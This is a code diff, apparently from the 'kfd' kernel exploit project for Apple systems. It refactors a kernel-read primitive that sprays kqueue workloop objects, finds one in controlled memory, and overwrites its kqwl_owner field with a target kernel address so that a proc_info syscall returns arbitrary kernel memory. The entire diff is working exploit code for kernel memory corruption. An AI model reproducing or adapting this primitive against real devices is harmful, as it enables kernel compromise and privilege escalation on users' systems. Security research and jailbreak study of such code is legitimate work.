@@ -12,7 +12,7 @@ u64 kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, u64 kaddr);
 void kread_kqueue_workloop_ctl_init(struct kfd* kfd)
 {
     kfd->kread.krkw_maximum_id = 100000;
-    kfd->kread.krkw_object_size = kfd_offset(kqworkloop__object_size);
+    kfd->kread.krkw_object_size = sizeof(struct kqworkloop);
 }
 
 void kread_kqueue_workloop_ctl_allocate(struct kfd* kfd, u64 id)
@@ -33,11 +33,12 @@ void kread_kqueue_workloop_ctl_allocate(struct kfd* kfd, u64 id)
 
 bool kread_kqueue_workloop_ctl_search(struct kfd* kfd, u64 object_uaddr)
 {
+    volatile struct kqworkloop* kqwl = (volatile struct kqworkloop*)(object_uaddr);
     u64 sentinel_min = kread_kqueue_workloop_ctl_sentinel;
     u64 sentinel_max = sentinel_min + kfd->kread.krkw_allocated_id;
 
-    u16 kqwl_state = uget_u64(kqworkloop__kqwl_state, object_uaddr);
-    u64 kqwl_dynamicid = uget_u64(kqworkloop__kqwl_dynamicid, object_uaddr);
+    u16 kqwl_state = kqwl->kqwl_kqueue.kq_state;
+    u64 kqwl_dynamicid = kqwl->kqwl_dynamicid;
 
     if ((kqwl_state == (KQ_KEV_QOS | KQ_WORKLOOP | KQ_DYNAMIC)) &&
         (kqwl_dynamicid >= sentinel_min) &&
@@ -57,8 +58,8 @@ void kread_kqueue_workloop_ctl_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u6
 
 void kread_kqueue_workloop_ctl_find_proc(struct kfd* kfd)
 {
-    u64 kqworkloop_uaddr = kfd->kread.krkw_object_uaddr;
-    kfd->info.kaddr.current_proc = uget_u64(kqworkloop__kqwl_p, kqworkloop_uaddr);
+    volatile struct kqworkloop* kqwl = (volatile struct kqworkloop*)(kfd->kread.krkw_object_uaddr);
+    kfd->info.kaddr.current_proc = kqwl->kqwl_kqueue.kq_p;
 }
 
 void kread_kqueue_workloop_ctl_deallocate(struct kfd* kfd, u64 id)
@@ -86,10 +87,10 @@ void kread_kqueue_workloop_ctl_free(struct kfd* kfd)
 
 u64 kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, u64 kaddr)
 {
-    u64 kqworkloop_uaddr = kfd->kread.krkw_object_uaddr;
-    u64 old_kqwl_owner = uget_u64(kqworkloop__kqwl_owner, kqworkloop_uaddr);
-    u64 new_kqwl_owner = kaddr - kfd_offset(thread__thread_id);
-    uset_u64(kqworkloop__kqwl_owner, new_kqwl_owner, kqworkloop_uaddr);
+    volatile struct kqworkloop* kqwl = (volatile struct kqworkloop*)(kfd->kread.krkw_object_uaddr);
+    u64 old_kqwl_owner = kqwl->kqwl_owner;
+    u64 new_kqwl_owner = kaddr - dynamic_info(thread__thread_id);
+    kqwl->kqwl_owner = new_kqwl_owner;
 
     struct kqueue_dyninfo data = {};
     i32 callnum = PROC_INFO_CALL_PIDDYNKQUEUEINFO;
@@ -100,7 +101,7 @@ u64 kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, u64 kaddr)
     i32 buffersize = (i32)(sizeof(struct kqueue_dyninfo));
     assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
 
-    uset_u64(kqworkloop__kqwl_owner, old_kqwl_owner, kqworkloop_uaddr);
+    kqwl->kqwl_owner = old_kqwl_owner;
     return data.kqdi_owner;
 }
 
